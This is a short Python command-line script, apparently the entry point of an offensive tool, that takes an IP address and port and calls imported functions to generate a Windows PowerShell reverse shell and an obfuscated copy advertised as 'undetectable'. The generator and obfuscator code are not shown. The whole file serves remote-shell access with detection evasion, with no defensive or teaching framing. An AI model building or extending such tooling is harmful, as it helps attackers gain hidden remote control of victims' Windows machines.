import argparse
from generator import generate_reverse_shell
from obfuscator import obfuscate_script

def main():
    parser = argparse.ArgumentParser(description="Generate an undetectable Windows reverse shell PowerShell script.")
    parser.add_argument("-i", "--ip", required=True, help="IP address for the reverse shell connection")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port for the reverse shell connection")
    
    args = parser.parse_args()
    shell_code = generate_reverse_shell(args.ip, args.port)
    obfuscated_code = obfuscate_script(shell_code)
    
    print("Generated PowerShell script:\n", shell_code)
    print("\nObfuscated PowerShell script:\n", obfuscated_code)

if __name__ == "__main__":
    main()

